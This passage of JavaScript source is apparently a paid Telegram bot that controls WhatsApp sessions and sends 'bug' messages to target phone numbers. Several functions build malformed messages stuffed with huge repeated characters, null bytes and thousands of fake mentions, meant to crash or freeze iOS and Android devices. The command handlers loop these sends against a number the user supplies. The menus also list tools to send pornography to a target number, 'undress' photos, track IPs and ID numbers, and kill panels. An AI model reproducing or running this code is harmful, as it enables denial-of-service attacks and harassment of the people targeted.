            name: 'mpm',
            buttonParamsJson: "{[" + "ꦽ".repeat(5000)
          },
          {
            name: 'galaxy_message',
            buttonParamsJson: "\n".repeat(10000)
          }
        ],
        messageParamsJson: "{[".repeat(5000)
      }
    });
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "OTAX IS HERE" + "ꦽ".repeat(5000)
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, content, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}

async function Vocabulary(sock, target, mention) {
    let PaymentMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "|",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options",
                        paramsJson: "\u0000"
                    },
                    entryPointConversionSource: "galaxy_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });

    await sock.relayMessage("status@broadcast", PaymentMsg.message, {
        messageId: PaymentMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    if (PaymentMsg) {
        await sock.relayMessage(target, {
            groupStatusMentionMessageV2: {
                message: {
                    protocolMessage: {
                        key: PaymentMsg.key,
                        type: 25
                    }
                }
            }
        }, {});
    }

    let menuOption = {
        eventMessage: {
            contextInfo: {}, 
            isCanceled: false, 
            name: " |", 
            description: " menu", 
            location: {
                degreesLongitude: 0,
                degreesLatitude: 0
            }, 
            joinLink: "https://whatsapp.call/voice/menuOptionGroup", 
            startTime: Date.now(), 
            endTime: Date.now() * 250208,
            extraGuestAllowed: true, 
            isSchuleCall: true
        }
    };
  
    await sock.relayMessage(target, menuOption, {
        participant: { jid: target }
    });
}

async function delayvisib(sock, target, mention = true) {
    const msg = {
        message: {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "4119307",
                        seconds: 13,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        height: 1280,
                        width: 960,
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1744620684",
                        jpegThumbnail: "BASE64-THUMB-TRUNCATED",
                        contextInfo: {
                            isSampled: true,
                            mentionedJid: [
                                "6281991410940@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () =>
                                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                )
                            ]
                        },
                        streamingSidecar: "APsZUnB5vlI7z28C...",
                        thumbnailDirectPath: "/v/t62.36147-24/31828404_...",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        annotations: [{
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "SVNX",
                                    songId: "MONITOR KETUA",
                                    author: "killerTxy2",
                                    title: "My Songs",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_...",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/raditx7",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            }
                        }],
                        nativeFlowResponseMessage: {
                            name: "flex_agency",
                            paramsJson: "\u0000".repeat(999999),
                            version: 3
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 9741,
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "newsletter2025",
                                newsletterJid: "120363319314627296@newsletter",
                                serverMessageId: 1
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: "delvis_" + Date.now(),
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: { remoteJid: "status@broadcast" },
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "KillerTzy Null" },
                    content: undefined
                }
            ]
        });
    }

    await new Promise(resolve => setTimeout(resolve, 9000));
}

async function DelayHhydra(sock, target) {
    let msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        participant: target,
                        remoteJid: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 9999).toString(),
                            creatorName: "ZayHere\\1337",
                        },
                    },
                    body: {
                        text: 'Zayy Cpe....' + new Date().toString() 
                    },
                    footer: {
                        text: 'Im Wanna Be Better..',
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(10000),
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },                                
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    status: true,
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: 'ZayyBete'
                                }),
                            },
                            {
                                name: "cta_url",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "Gatau"
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "ZayyGptJier"
                                }),
                            },
                            {
                                name: "payment_info",
                                buttonParamsJson: JSON.stringify({
                                        currency: "USD",
                                        total_amount: { value: 9000, offset: 100 },
                                        reference_id: "4P46GMY57GC",
                                        type: "physical-goods",
                                        order: {
                                            status: "pending",
                                            subtotal: { value: 9000, offset: 100 },
                                            order_type: "ORDER",
                                            items: [
                                                {
                                                    name: " Zay Come Back ",
                                                    amount: { value: 9000, offset: 100 },
                                                    quantity: 1,
                                                    sale_amount: { value: 9000, offset: 100 }
                                                }
                                            ]
                                        },
                                        payment_settings: [
                                            {
                                                type: "pix_static_code",
                                                pix_static_code: {
                                                    merchant_name: " ZayComebackX ",
                                                    key: "+99999999999",
                                                    key_type: "PHONE"
                                                },
                                            },
                                        ],
                                    }),
                                },
                            ],
                        },
                    },
                },  
            },
        };

        await sock.relayMessage(target, msg1, {
            messageId: null,
            participant: { jid: target },
        });

        let msg4 = {
            interactiveMessage: {
                header: {
                    title: '\u0000',
                    hasMediaAttahment: true,
                },
                body: {
                    text: '𑜦𑜠'.repeat(10000),
                },
                footer: {
                    text: 'Zinging',
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "cta_url", buttonParamsJson: "\u0003".repeat(1000) },
                        { name: "call_permission_request", buttonParamsJson: "\u0003".repeat(1000) },
                    ],
                },
                contextInfo: {
                    stanzaId: Math.floor(Math.random() * 9999).toString(),
                    isForwarded: true,
                    forwardingScore: 999,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                        ),
                    ],
                    quotedMessage: {
                        interactiveMessage: {
                            body: {
                                text: 'Ui',
                            },
                            footer: {
                                text: '𑜦𑜠',
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{}",
                            },
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, msg4, {
            messageId: null,
            participant: { jid: target },
        });
        console.log(chalk.red(`Succes Sending Bug Delay Hydra To ${target}`));
    }

async function albumpolygon(sock, target) {
  const polygonHeavy = Array.from({ length: 9999 }, (_, i) => ({
    x: (i ** 9 % 1e9) * Math.random(),
    y: (i ** 3 % 1e9) * Math.random(),
    nested: Array.from({ length: 6 }, () => ({
      a: "\u0000".repeat(99999),
      b: [Infinity, NaN, -Infinity, 9999999999],
      c: { deep: Array(50).fill("\u0000".repeat(9999)) }
    }))
  }));
  
  const ImgBuffer = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
      fileLength: 99999999999,
      height: 1280,
      width: 720,
      mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
      fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
      directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
      mediaKeyTimestamp: 1758521043,
      isSampled: true,
      viewOnce: false,
      scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
      scanLengths: [3599, 9271, 2026, 2778],
      midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
      annotations: [
        {
          polygonVertices: polygonHeavy,
          newsletter: {
            newsletterJid: "120363330344810280@newsletter",
            serverMessageId: 8888,
            newsletterName: " ~ R𝟺ʟᴅzExǝcut¡!on— ",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(1000)
          }
        }
      ],
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      },
    }
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: -999999999,
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  const msg = await generateWAMessage(target, ImgBuffer, {
    upload: sock.waUploadToServer
  });

  const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

  msg.message[type].contextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      newsletterName: " ~ R𝟺ʟᴅzExǝcut¡!on— ",
      contentType: "UPDATE_CARD",
      accessibilityText: "\u0000".repeat(9000),
      serverMessageId: 8888888
    },
    mentionedJid: [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 1999 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ],
    messageAssociation: {
      associationType: 1,
      parentMessageKey: album.key
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}
// ---- ( End Function ) ----- \\          
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

// -- ( Start Menu )
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // ============================
  // 🔐 CEK VERIFIKASI KEY DULU
  // ============================
  if (!verifiedUsers.has(senderId)) {
    waitingKey.add(senderId);

    return bot.sendMessage(
      chatId,
      `🔐 *Verifikasi Key Dibutuhkan*\n
Sebelum menggunakan bot, kirim *KEY AKSES* kamu.\n
Contoh Key:\n\`PUB-ABCDE12345\`\n
Jika tidak punya key, hubungi owner.`,
      { parse_mode: "Markdown" }
    );
  }

  // ============================
  // KEY SUDAH VERIFIED → LANJUT CEK PREMIUM
  // ============================
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  // CEK PREMIUM
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nNo-akses Anda Bukan User Premium❗\`\`\`
Tidak ada akses, silakan hubungi Developer Atau Owner`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Author", url: "https://t.me/Serenhope" }],
        ],
      },
    });
  }
  await ReactMsg(chatId, msg.message_id, "👾");
  await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

✧. Bot : ѕσ¢ѕυѕ ↯ нєχα
✧. Version : 1.0.0 Gen 2
✧. Prefix : /
✧. InterFace : Button Type
✧. Type : ( Plugin )
✧. Time : ${runtime}

<b>Select Button Menu ⸸</b>
`,
    parse_mode: "HTML",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
         [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🕊️", callback_data: "tqto" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🪯", callback_data: "update" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🕸️ ", callback_data: "owner_menu" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🦠", callback_data: "bug" 
          }
        ],
        [
          {
            text: "†ððl§ ─ 📎", callback_data: "tools"
          }
        ]
      ]
    }
  }); 
  await bot.sendAudio(
  chatId,
  "./ТАЗИ ПЕСЕН/ѕσ¢ѕυѕ ↯ нєχα.mp3",
  {
    title: "ѕσ¢ѕυѕ ↯ нєχα",
    caption: "ѕσ¢ѕυѕ ↯ нєχα",
    performer: "ѕσ¢ѕυѕ ↯ нєχα.</vrl>",
  }
);
});

// -- ( Callback Query Menu ) -- \\
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();
    let caption = "";
    let replyMarkup = {};
    if (query.data === "bug") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕ ↯ нєχα - BVG ⸸  ｣</b></blockquote>
✧. /Hecaios 628xx
╰⩺ IOS STUCK HOME 80℅
✧. /Vocandio 628xx
╰⩺ ANDROID DELAY 95℅
✧. /Hecaandro 628xx
╰⩺ ANDROID DELAY INVISIBLE 100℅
✧. /Vocandelay
╰⩺ ANDROID DELAY VISIBLE 100℅
✧. /Vocablank
╰⩺ ANDROID BlANK 100℅

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ßå̊¢k ─ ⚓", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "tqto") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕ ↯ нєχα ⸸  ｣</b></blockquote>
<u>✧. #Seren ⸸</u>
╰⩺ Author      
<u>✧. #OBITO ⸸</u>
╰⩺ SUPPORT   
<u>✧. #Gabriel ⸸</u>
╰⩺ SUPPORT 
<u>✧. #Xatanical ⸸</u>
╰⩺ SUPPORT          
<u>✧. #Zay ⸸</u>
╰⩺ TEAM Socsus Hexa SECRET  
╰⩺ SUPPORT     
<u>✧. #ALL RESELLER/PT/MOD/OWNER ⸸</u>
╰⩺ SUPPORT     
<u>✧. #ALL BUYER ⸸</u>
╰⩺ SUPPORT

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ßå¢k ─ ⚓", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "update") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕ ↯ нєχα ⸸  ｣</b></blockquote>

<u>✧. /update </u>
╰⩺ UPDATE YOUR SC
<u>✧. /autoupdate </u>
╰⩺ AUTO UPDATE YOU SC

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ßå¢k ─ ⚓", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "tools") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕнєχα - TӨLS ⸸  ｣</b></blockquote>
<u>✧. /tonaked </u>
╰⩺ Reply Foto
<u>✧. /cekid </u>
╰⩺ Reply Msg/Tag Account 
<u>✧. /tourl </u>
╰⩺ Reply Foto
<u>✧. /brat</u>
╰⩺ Text 
<u>✧. /restart</u>
╰⩺ Merestart Session Bot
<u>✧. /ig</u>
╰⩺ Link
<u>✧. /pinterest</u>
╰⩺ Foto
<u>✧. /convertcase ntba/telegraf/bailyes</u>
╰⩺ Convert Case ( Reply File ) atau Reply Kode nya 
<u>✧. /toimage</u>
╰⩺ Reply Sticker dijadikan gambar
<u>✧. /sticker</u>
╰⩺ Reply Foto yang mau dijadikan sticker
<u>✧. /play</u>
╰⩺ Mencari Lagu
<u>✧. /brat</u>
╰⩺ Buat Sticker Brat
<u>✧. /nulis</u>
╰⩺ Buat Gambar tulisan di buku tulis
<u>✧. /iqc</u>
╰⩺ jam|batre|carrier|pesan
<u>✧. /japan</u>
╰⩺ encrypted Japanese
<u>✧. /ssweb</u>
╰⩺ Screenshot web
<u>✧. /createnama</u>
╰⩺ Bikin nama secara acak

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ßÄÇK ─ ⚓", callback_data: "back_to_main" }],
          [{ text: "†ððl§ V2 ─ 🔎", callback_data: "toolsv2" }],
        ],
      };
    }
    if (query.data === "toolsv2") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕнєχα - TӨLS ⸸  ｣</b></blockquote>
<u>✧. /fixcode - reply file.js </u>
╰⩺ Fixed Eror Tidak 100%
<u>✧. /colongsender </u>
╰⩺ Steal the Sender 
<u>✧. /tes </u>
╰⩺ Tester Function Bug
<u>✧. /gethtml</u>
╰⩺ Lock Code Html 
<u>✧. /trackip</u>
╰⩺ Tracking Ip
<u>✧. /nikparse  </u>
╰⩺ Tracking Nik
<u>✧. /enchtml  </u>
╰⩺ Encrypt HTML
<u>✧. /sendbokep  </u>
╰⩺ Kirim bokep ke nomor target
<u>✧. /killpanel </u>
╰⩺ KILL PANEL TARGET JIKA KAU DENDAM

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "†ððl§ ─ ⚓", callback_data: "tools" }],
          ],
      };
    }
    if (query.data === "owner_menu") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

<blockquote><b>｢ ѕσ¢ѕυѕ ↯ нєχα ⸸  ｣</b></blockquote>
✧. /addsender 62xxx
✧. /listsender
✧. /addprem ID - DAYS
✧. /delprem ID
✧. /listprem
✧. /addowner ID
✧. /delowner ID
✧. /cooldown 5 MINUTE

© ѕσ¢ѕυѕнєχα ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ѕσ¢ѕυѕнєχα ─ ⚓", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>⟐  ｢ ѕσ¢ѕυѕ нєχα ρяιмє єχє¢υтιση ｣  ⟐</b></blockquote>
 👾 - õla ${username}
<b>─ — Telegram bot Socsus Hexa successfully initialized.
— Operating in enhanced Prime execution mode</b>

✧. Bot : ѕσ¢ѕυѕ ↯ нєχα
✧. Version : 1.0.0 Gen 2
✧. Prefix : /
✧. InterFace : Button Type
✧. Type : ( Plugin )
✧. Time : ${runtime}

<b>Select Button Menu ⸸</b>
`;
      replyMarkup = {
        inline_keyboard: [
         [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🕊️", callback_data: "tqto" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🪯", callback_data: "update" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🕸️ ", callback_data: "owner_menu" 
          },
        ],
        [
          { 
            text: "ѕσ¢ѕυѕнєχα ─ 🦠", callback_data: "bug" 
          }
        ],
        [
          {
            text: "†ððl§ ─ 📎", callback_data: "tools"
          }
        ]
        ]
      };
    }
    await bot.editMessageMedia(
      {
        type: "photo",
        media: getRandomImage(),
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// =======================
// 🔐 BLOCK USER TANPA VERIFIKASI KEY
// =======================
bot.use(async (ctx, next) => {
  const id = ctx.from?.id;
  const chatId = ctx.chat?.id || id; // fallback biar tidak undefined

  if (!verifiedUsers.has(id) && !waitingKey.has(id)) {

    // Jika callback_query
    if (ctx.data) {
      return bot.answerCallbackQuery(ctx.id, {
        text: "⚠️ Kamu belum verifikasi key!",
        show_alert: true
      }).catch(() => {});
    }

    // Jika message
    if (chatId) {
      return bot.sendMessage(chatId, "🚫 Kamu belum verifikasi key. Ketik /start.")
        .catch(() => {});
    }

    return; 
  }

  return next();
});

bot.on("message", async (msg) => {
  msg.updateType = "message";
  msg.text = msg.text || "";   // FIX
  await runMiddlewares(msg);
});

bot.on("callback_query", async (cb) => {
  cb.updateType = "callback_query";
  cb.data = cb.data || "";    // FIX
  await runMiddlewares(cb);
});

// --- ( Case Bug ) --- \\
bot.onText(/\/Hecaios (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Developer", url: "https://t.me/Serenhope" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Hecaios
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Hecaios
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 100; i++) {
         await iOSX(sock, istarget);
         await iosinVisFC3(sock, istarget);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 ѕσ¢ѕυѕнєχα  ⵢ Volcanic 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Hecaios
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Hecaandro (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
